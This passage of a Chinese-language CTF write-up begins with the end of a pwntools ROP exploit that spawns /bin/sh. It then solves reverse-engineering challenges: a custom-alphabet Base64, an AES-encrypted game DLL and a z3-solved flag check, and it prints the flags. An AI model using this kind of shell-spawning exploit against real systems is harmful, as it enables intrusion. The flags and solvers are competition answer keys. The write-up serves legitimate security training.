\"-h\"]\n\neax=0x080b470a\nebx=0x08049022\necx=0x08049802\nedx=0x08060bd1\n\nrop=p32(eax)+p32(0xb)\nrop+=p32(ebx)+p32(0x80ef344)\nrop+=p32(ecx)+p32(0)\nrop+=p32(edx)+p32(0)\nrop+=p32(0x08049c6a)\nrop+=b\"/bin/sh\\0\"\n\nprint(len(rop))\nio.sendafter(\"name?\", rop)\n\np=b'A'*(200)+p32(0x080EF320+4)*3\nio.sendlineafter(\"right?\", p)\n\nio.interactive()\n```\n\n## Reverse\n\n### Base64\n\nBase64变种加密\n\n```cpp\n_BYTE *__fastcall sub_7FF7DC6C10E0(__int64 a1)\n{\n  __int64 v2; // rbx\n  __int64 v3; // rbp\n  int v4; // edx\n  int v5; // edi\n  int v6; // edx\n  __int64 v7; // r14\n  size_t v8; // rcx\n  _BYTE *v9; // r8\n  __int64 v10; // r9\n  unsigned __int64 v11; // rdx\n  int v12; // ecx\n  unsigned int v13; // ecx\n  unsigned int v14; // eax\n  int v15; // eax\n  int v16; // eax\n  int v17; // eax\n  int v18; // edi\n  __int64 v19; // rdx\n  int v20; // eax\n  int v21; // eax\n  int v22; // ecx\n  unsigned int v23; // edx\n  int v24; // ecx\n  int v25; // eax\n  int v26; // ecx\n  unsigned int v27; // ecx\n  unsigned int v28; // eax\n  char v30[80]; // [rsp+20h] [rbp-68h] BYREF\n  int v31; // [rsp+90h] [rbp+8h]\n\n  v2 = -1;\n  strcpy(v30, \"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\");\n  do\n    ++v2;\n  while ( *(_BYTE *)(a1 + v2) );\n  v3 = 0;\n  v4 = (int)v2 / 3;\n  if ( (_DWORD)v2 == 3 * ((int)v2 / 3) )\n  {\n    v5 = 0;\n    v6 = 4 * v4;\n  }\n  else if ( (int)v2 % 3 == 1 )\n  {\n    v5 = 1;\n    v6 = 4 * v4 + 4;\n  }\n  else if ( (int)v2 % 3 == 2 )\n  {\n    v5 = 2;\n    v6 = 4 * v4 + 4;\n  }\n  else\n  {\n    v5 = v31;\n    v6 = v31;\n  }\n  v7 = v6;\n  v8 = v6 + 1LL;\n  if ( v6 == -1 )\n    v8 = -1;\n  v9 = malloc(v8);\n  if ( (int)v2 - v5 > 0 )\n  {\n    v10 = a1 + 2;\n    v11 = ((int)v2 - v5 - 1LL) / 3uLL + 1;\n    do\n    {\n      v3 += 4;\n      v12 = *(unsigned __int8 *)(v10 - 2) >> 2;\n      v10 += 3;\n      v13 = v12 + 24;\n      v14 = v13 - 64;\n      if ( v13 <= 0x40 )\n        v14 = v13;\n      v9[v3 - 4] = v30[v14];\n      v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) - 40;\n      if ( ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3u))) + 24 <= 0x40 )\n        v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) + 24;\n      v9[v3 - 3] = v30[v15];\n      v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) - 40;\n      if ( ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xFu))) + 24 <= 0x40 )\n        v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) + 24;\n      v9[v3 - 2] = v30[v16];\n      v17 = (*(_BYTE *)(v10 - 3) & 0x3F) - 40;\n      if ( (*(_BYTE *)(v10 - 3) & 0x3Fu) + 24 <= 0x40 )\n        v17 = (*(_BYTE *)(v10 - 3) & 0x3F) + 24;\n      v9[v3 - 1] = v30[v17];\n      --v11;\n    }\n    while ( v11 );\n  }\n  v18 = v5 - 1;\n  if ( !v18 )\n  {\n    v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) - 40;\n    if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24 <= 0x40u )\n      v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24;\n    v9[v7 - 4] = v30[v25];\n    v26 = *(_BYTE *)((int)v2 + a1 - 1) & 3;\n    *(_WORD *)&v9[v7 - 2] = 15677;\n    v27 = 16 * v26 + 24;\n    v28 = v27 - 64;\n    if ( v27 <= 0x40 )\n      v28 = v27;\n    v9[v7 - 3] = v30[v28];\n    goto LABEL_37;\n  }\n  if ( v18 != 1 )\n  {\nLABEL_37:\n    v9[v7] = 0;\n    return v9;\n  }\n  v19 = a1 + (int)v2;\n  v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) - 40;\n  if ( (*(unsigned __int8 *)(v19 - 2) >> 2) + 24 <= 0x40u )\n    v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) + 24;\n  v9[v7 - 4] = v30[v20];\n  v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) - 40;\n  if ( ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3u))) + 24 <= 0x40 )\n    v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) + 24;\n  v9[v7 - 3] = v30[v21];\n  v22 = *(_BYTE *)(v19 - 1) & 0xF;\n  *(_WORD *)&v9[v7 - 1] = 61;\n  v23 = 4 * v22 + 24;\n  v24 = 4 * v22 - 40;\n  if ( v23 <= 0x40 )\n    v24 = v23;\n  v9[v7 - 2] = v30[v24];\n  return v9;\n}\n```\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nchar *base64_decode(const char *input)\n{\n    const char *base64_table = \"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\";\n\n    unsigned char reverse_table[256] = {0};\n    for (int i = 0; i < 64; i++)\n    {\n        reverse_table[(unsigned char)base64_table[i]] = i;\n    }\n\n    size_t input_len = strlen(input);\n    size_t padding = 0;\n\n    if (input_len > 0 && input[input_len - 1] == '=')\n    {\n        padding++;\n        if (input_len > 1 && input[input_len - 2] == '=')\n        {\n            padding++;\n        }\n    }\n\n    size_t output_len = (input_len * 3) / 4 - padding;\n    unsigned char *output = (unsigned char *)malloc(output_len + 1);\n    output[output_len] = 0;\n\n    size_t i = 0, j = 0;\n    while (i < input_len - padding)\n    {\n        unsigned char b1, b2, b3, b4;\n\n        unsigned char v1 = reverse_table[input[i++]];\n        unsigned char v2 = reverse_table[input[i++]];\n        unsigned char v3 = (i < input_len) ? reverse_table[input[i++]] : 0;\n        unsigned char v4 = (i < input_len) ? reverse_table[input[i++]] : 0;\n\n        b1 = (v1 > 24) ? (v1 - 24) : (v1 + 64 - 24);\n        b2 = (v2 > 24) ? (v2 - 24) : (v2 + 64 - 24);\n        b3 = (v3 > 24) ? (v3 - 24) : (v3 + 64 - 24);\n        b4 = (v4 > 24) ? (v4 - 24) : (v4 + 64 - 24);\n\n        if (j < output_len)\n            output[j++] = (b1 << 2) | (b2 >> 4);\n        if (j < output_len)\n            output[j++] = (b2 << 4) | (b3 >> 2);\n        if (j < output_len)\n            output[j++] = (b3 << 6) | b4;\n    }\n\n    return (char *)output;\n}\n\nint main()\n{\n    const char *Enc= \"AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\";\n    char *Decoded= base64_decode(Enc);\n    printf(\"%s\\n\", Decoded);\n    free(decoded);\n    return 0;\n}\n```\n\nHZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}\n\n### 水果忍者\n\n主要dll目录：\\水果忍者\\Fruit Ninja_Data\\Managed\\Assembly-CSharp.dll\n\n拖入dnSpy分析，是AES CBC加密。\n\n![img](/images/1744633170177-5.png)\n\n底下有密文、密钥、iv，直接解密即可。\n\n![img](/images/1744633170177-6.png)\n\n![img](/images/1744633170177-7.png)\n\nHZNUCTF{de20-70dd-4e62-b8d0-06e}\n\n### 蛇年的本命语言\n\npython程序解包得到pyc（python 3.8），使用uncompyle6解密得到代码。\n\n```python\nfrom collections import Counter\nprint(\"Welcome to HZNUCTF!!!\")\nprint(\"Plz input the flag:\")\nooo0oOoooOOO0 = input()\noOO0OoOoo000 = Counter(ooo0oOoooOOO0)\nO0o00 = \"\".join((str(oOO0OoOoo000[oOooo0OOO]) for oOooo0OOO in ooo0oOoooOOO0))\nprint(\"ans1: \", end=\"\")\nprint(O0o00)\nif O0o00 != \"111111116257645365477364777645752361\":\n    print(\"wrong_wrong!!!\")\n    exit(1)\niiIII = \"\"\nfor oOooo0OOO in ooo0oOoooOOO0:\n    if oOO0OoOoo000[oOooo0OOO] > 0:\n        iiIII += oOooo0OOO + str(oOO0OoOoo000[oOooo0OOO])\n        oOO0OoOoo000[oOooo0OOO] = 0\n    else:\n        i11i1Iii1I1 = [ord(oOooo0OOO) for oOooo0OOO in iiIII]\n        ii1iIi1i11i = [\n         7 * i11i1Iii1I1[0] == 504,\n         9 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] == 403,\n         2 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] == 799,\n         3 * i11i1Iii1I1[0] + 8 * i11i1Iii1I1[1] + 15 * i11i1Iii1I1[2] + 20 * i11i1Iii1I1[3] == 2938,\n         5 * i11i1Iii1I1[0] + 15 * i11i1Iii1I1[1] + 20 * i11i1Iii1I1[2] - 19 * i11i1Iii1I1[3] + 1 * i11i1Iii1I1[4] == 2042,\n         7 * i11i1Iii1I1[0] + 1 * i11i1Iii1I1[1] + 9 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 2 * i11i1Iii1I1[4] + 5 * i11i1Iii1I1[5] == 1225,\n         11 * i11i1Iii1I1[0] + 22 * i11i1Iii1I1[1] + 33 * i11i1Iii1I1[2] + 44 * i11i1Iii1I1[3] + 55 * i11i1Iii1I1[4] + 66 * i11i1Iii1I1[5] - 77 * i11i1Iii1I1[6] == 7975,\n         21 * i11i1Iii1I1[0] + 23 * i11i1Iii1I1[1] + 3 * i11i1Iii1I1[2] + 24 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] - 7 * i11i1Iii1I1[6] + 15 * i11i1Iii1I1[7] == 229,\n         2 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 13 * i11i1Iii1I1[2] + 0 * i11i1Iii1I1[3] - 65 * i11i1Iii1I1[4] + 15 * i11i1Iii1I1[5] + 29 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] + 20 * i11i1Iii1I1[8] == 2107,\n         10 * i11i1Iii1I1[0] + 7 * i11i1Iii1I1[1] + -9 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] + 22 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] - 22 * i11i1Iii1I1[8] + 30 * i11i1Iii1I1[9] == 4037,\n         15 * i11i1Iii1I1[0] + 59 * i11i1Iii1I1[1] + 56 * i11i1Iii1I1[2] + 66 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] - 122 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 3 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] == 4950,\n         13 * i11i1Iii1I1[0] + 66 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 39 * i11i1Iii1I1[3] - 33 * i11i1Iii1I1[4] + 13 * i11i1Iii1I1[5] - 2 * i11i1Iii1I1[6] + 42 * i11i1Iii1I1[7] + 62 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] == 12544,\n         23 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 3 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 63 * i11i1Iii1I1[5] - 25 * i11i1Iii1I1[6] + 2 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] == 6585,\n         223 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] - 29 * i11i1Iii1I1[2] - 53 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 3 * i11i1Iii1I1[5] - 65 * i11i1Iii1I1[6] + 0 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 15 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 13 * i11i1Iii1I1[13] == 6893,\n         29 * i11i1Iii1I1[0] + 13 * i11i1Iii1I1[1] - 9 * i11i1Iii1I1[2] - 93 * i11i1Iii1I1[3] + 33 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] + 65 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] - 36 * i11i1Iii1I1[8] + 0 * i11i1Iii1I1[9] - 16 * i11i1Iii1I1[10] + 96 * i11i1Iii1I1[11] - 68 * i11i1Iii1I1[12] + 33 * i11i1Iii1I1[13] - 14 * i11i1Iii1I1[14] == 1883,\n         69 * i11i1Iii1I1[0] + 77 * i11i1Iii1I1[1] - 93 * i11i1Iii1I1[2] - 12 * i11i1Iii1I1[3] + 0 * i11i1Iii1I1[4] + 0 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 16 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 6 * i11i1Iii1I1[9] + 19 * i11i1Iii1I1[10] + 66 * i11i1Iii1I1[11] - 8 * i11i1Iii1I1[12] + 38 * i11i1Iii1I1[13] - 16 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] == 8257,\n         23 * i11i1Iii1I1[0] + 2 * i11i1Iii1I1[1] - 3 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 12 * i11i1Iii1I1[4] + 24 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] + 14 * i11i1Iii1I1[8] - 0 * i11i1Iii1I1[9] + 1 * i11i1Iii1I1[10] + 68 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 68 * i11i1Iii1I1[13] - 26 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] - 16 * i11i1Iii1I1[16] == 5847,\n         24 * i11i1Iii1I1[0] + 0 * i11i1Iii1I1[1] - 1 * i11i1Iii1I1[2] - 15 * i11i1Iii1I1[3] + 13 * i11i1Iii1I1[4] + 4 * i11i1Iii1I1[5] + 16 * i11i1Iii1I1[6] + 67 * i11i1Iii1I1[7] + 146 * i11i1Iii1I1[8] - 50 * i11i1Iii1I1[9] + 16 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 27 * i11i1Iii1I1[14] + 45 * i11i1Iii1I1[15] - 6 * i11i1Iii1I1[16] + 17 * i11i1Iii1I1[17] == 18257,\n         25 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] - 89 * i11i1Iii1I1[2] + 16 * i11i1Iii1I1[3] + 19 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 150 * i11i1Iii1I1[8] - 250 * i11i1Iii1I1[9] + 166 * i11i1Iii1I1[10] + 126 * i11i1Iii1I1[11] - 11 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 207 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] == 12591,\n         5 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 8 * i11i1Iii1I1[2] + 160 * i11i1Iii1I1[3] + 9 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 15 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 66 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] + 19 * i11i1Iii1I1[19] == 52041,\n         29 * i11i1Iii1I1[0] - 26 * i11i1Iii1I1[1] + 0 * i11i1Iii1I1[2] + 60 * i11i1Iii1I1[3] + 90 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 6 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 16 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 69 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] - 46 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] - 1 * i11i1Iii1I1[18] + 39 * i11i1Iii1I1[19] - 20 * i11i1Iii1I1[20] == 20253,\n         45 * i11i1Iii1I1[0] - 56 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] + 650 * i11i1Iii1I1[3] - 900 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 6 * i11i1Iii1I1[7] - 6 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 2 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 651 * i11i1Iii1I1[16] + 2 * i11i1Iii1I1[17] - 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] - 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] == 18768,\n         555 * i11i1Iii1I1[0] - 6666 * i11i1Iii1I1[1] + 70 * i11i1Iii1I1[2] + 510 * i11i1Iii1I1[3] - 90 * i11i1Iii1I1[4] + 499 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 66 * i11i1Iii1I1[7] - 610 * i11i1Iii1I1[8] - 221 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 23 * i11i1Iii1I1[11] - 102 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 2050 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 665 * i11i1Iii1I1[16] + 333 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 22 * i11i1Iii1I1[22] == 111844,\n         1 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4444 * i11i1Iii1I1[3] - 5555 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] - 666 * i11i1Iii1I1[6] + 676 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 22 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 73 * i11i1Iii1I1[11] - 107 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] - 6 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 39 * i11i1Iii1I1[17] + 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] == 159029,\n         520 * i11i1Iii1I1[0] - 222 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56655 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 73 * i11i1Iii1I1[11] + 1007 * i11i1Iii1I1[12] + 7777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 99999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] == 2762025,\n         1323 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 9999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] == 1551621,\n         777 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 999 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] == 948348,\n         97 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] + 96 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] == 777044,\n         177 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 699 * i11i1Iii1I1[2] + 64 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] - 96 * i11i1Iii1I1[5] - 66 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 28 * i11i1Iii1I1[28] == 185016,\n         77 * i11i1Iii1I1[0] - 2 * i11i1Iii1I1[1] + 6 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] - 96 * i11i1Iii1I1[4] - 9 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 0 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 9 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 26 * i11i1Iii1I1[25] - -58 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 2 * i11i1Iii1I1[28] + 29 * i11i1Iii1I1[29] == 130106]\n        if all(ii1iIi1i11i):\n            print(\"Congratulation!!!\")\n        else:\n            print(\"wrong_wrong!!!\")\n```\n\n是计下flag里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，\n\n将下面的z3解出可以得到一个字符串**H1Z1N1U1C1T1F1{1a6d275f7-463}**\n\n一个字符一个数字配对，代表该字符在原flag中出现的次数。\n\n除去前面HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**\"111111116257645365477364777645752361\"**去一一对应。\n\n解密代码：\n\n```Python\nfrom z3 import *\n\ndef decrypt(encrypted):\n    mapping = \"6257645365477364777645752361\"\n    \n    char_map = {}\n\n    remaining_map = {\n        '6': 'a',\n        '2': 'd',\n        '5': '7',\n        '7': 'f',\n        '4': '-',\n        '3': '6',\n        '1': '}'\n    }\n    char_map.update(remaining_map)\n    \n    result = \"HZNUCTF{\"\n    for num in mapping:\n        result += char_map[num]\n    \n    return result\n\ns = Solver()\n\nEnc = [Int(f'x{i}') for i in range(30)]\n\ns.add(7 * Enc[0] == 504)\ns.add(9 * Enc[0] - 5 * Enc[1] == 403)\ns.add((2 * Enc[0] - 5 * Enc[1]) + 10 * Enc[2] == 799)\ns.add(3 * Enc[0] + 8 * Enc[1] + 15 * Enc[2] + 20 * Enc[3] == 2938)\ns.add((5 * Enc[0] + 15 * Enc[1] + 20 * Enc[2] - 19 * Enc[3]) + 1 * Enc[4] == 2042)\ns.add((7 * Enc[0] + 1 * Enc[1] + 9 * Enc[2] - 11 * Enc[3]) + 2 * Enc[4] + 5 * Enc[5] == 1225)\ns.add(11 * Enc[0] + 22 * Enc[1] + 33 * Enc[2] + 44 * Enc[3] + 55 * Enc[4] + 66 * Enc[5] - 77 * Enc[6] == 7975)\ns.add(((21 * Enc[0] + 23 * Enc[1] + 3 * Enc[2] + 24 * Enc[3] - 55 * Enc[4]) + 6 * Enc[5] - 7 * Enc[6]) + 15 * Enc[7] == 229)\ns.add((2 * Enc[0] + 26 * Enc[1] + 13 * Enc[2] + 0 * Enc[3] - 65 * Enc[4]) + 15 * Enc[5] + 29 * Enc[6] + 1 * Enc[7] + 20 * Enc[8] == 2107)\ns.add((10 * Enc[0] + 7 * Enc[1] + -9 * Enc[2] + 6 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] + 22 * Enc[6] + 21 * Enc[7] - 22 * Enc[8]) + 30 * Enc[9] == 4037)\ns.add((15 * Enc[0] + 59 * Enc[1] + 56 * Enc[2] + 66 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] - 122 * Enc[6]) + 21 * Enc[7] + 32 * Enc[8] + 3 * Enc[9] - 10 * Enc[10] == 4950)\ns.add((((13 * Enc[0] + 66 * Enc[1] + 29 * Enc[2] + 39 * Enc[3] - 33 * Enc[4]) + 13 * Enc[5] - 2 * Enc[6]) + 42 * Enc[7] + 62 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] == 12544)\ns.add((((23 * Enc[0] + 6 * Enc[1] + 29 * Enc[2] + 3 * Enc[3] - 3 * Enc[4]) + 63 * Enc[5] - 25 * Enc[6]) + 2 * Enc[7] + 32 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] - 12 * Enc[12] == 6585)\ns.add(((((223 * Enc[0] + 6 * Enc[1] - 29 * Enc[2] - 53 * Enc[3] - 3 * Enc[4]) + 3 * Enc[5] - 65 * Enc[6]) + 0 * Enc[7] + 36 * Enc[8] + 1 * Enc[9] - 15 * 